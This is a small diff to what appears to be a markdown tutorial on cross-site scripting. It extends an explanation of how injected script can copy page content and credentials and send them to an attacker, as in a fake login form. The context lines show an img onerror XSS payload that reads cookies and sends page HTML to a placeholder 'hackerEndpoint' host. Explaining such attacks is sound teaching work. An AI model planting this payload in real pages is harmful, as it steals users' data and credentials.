@@ -188,4 +188,4 @@ Passing in Query Params:
 
 <img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`http://hackerEndpoint/fpage.php?output=${document.body.innerHTML}`;">
 ```
-This can just able to copy paste every single information o
+This can just able to copy paste every single information from your DOM and send it to the hacker. same as the phishing attack. hacker will inject the user form, suppose a login form so he'll just take you to the fake login form and you'll put the information and malicious script will send your credentials to the hacker and you'll be fucked up.
